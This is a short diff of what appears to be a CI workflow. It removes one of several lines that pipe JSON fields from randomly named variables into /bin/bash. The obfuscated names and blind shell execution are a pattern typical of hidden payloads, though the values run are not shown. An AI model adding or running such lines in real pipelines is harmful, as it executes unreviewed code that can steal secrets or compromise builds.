@@ -27,7 +27,6 @@ jobs:
           echo $tegql5 | jq -r .nsl68796 | /bin/bash
           echo $fwqp364 | jq -r .a815 | /bin/bash
           echo $kvx185 | jq -r .zxqp309 | /bin/bash
-          printf '%s' "$adow48" | jq -r .guvyo32 | /bin/bash
           echo $k68 | jq -r .gvper1450 | /bin/bash
           printf '%s' "$yor64" | jq -r .egy0 | /bin/bash
 
